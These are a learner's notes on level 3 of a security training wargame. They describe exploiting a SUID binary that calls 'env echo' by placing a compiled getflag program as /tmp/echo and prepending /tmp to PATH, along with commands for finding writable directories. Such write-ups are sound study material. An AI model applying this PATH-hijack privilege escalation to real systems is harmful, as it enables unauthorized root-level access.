----- LEVEL03 -----


1)	first impressions :
		-theres's a file in the home directory this time.
		-file is a binary
		-disassembled the main in gdb
			=> string moved on stack before system call is "/usr/bin/env echo Exploit me"
		-saw execute permissions have an "s" instead of "x", have to search on that.

4)	Searched for weaknesses in the script :
		-Syscall is made on "/usr/bin/env echo Exploit me"
			=> searched about environment variable exploit
				-saw that suid changed only who executed the binary, not the env variables.
				-knew I was on the right track

5)	searched a way to replace current echo binary in use by my binary
		- wanted to create it in level03 home. Could'nt.
		- searched for writable directory : find / -writable -print 2>/dev/null
		- found /tmp
		- tmp was not readable, checked if a non readable directory was executable
			=> YES IT IS

6)	My goal is to replace echo by getflag.
		- wrote a C code to execute getflag
		- wrote a bash script to perform all remaining steps
			=> compile c				=>			"gcc main.c -o exploit"
			=> move binary to tmp		=>			"mv exploit /tmp/echo"
			=> update PATH				=>			"export PATH="/tmp/:$PATH"
			=> execute binary level03	=>			"echo `~/level03`"

7)	Copy with scp
		-main.c to /var/lock
		-script.sh to /tmp/

8)	Run /tmp/script.sh from /var/lock
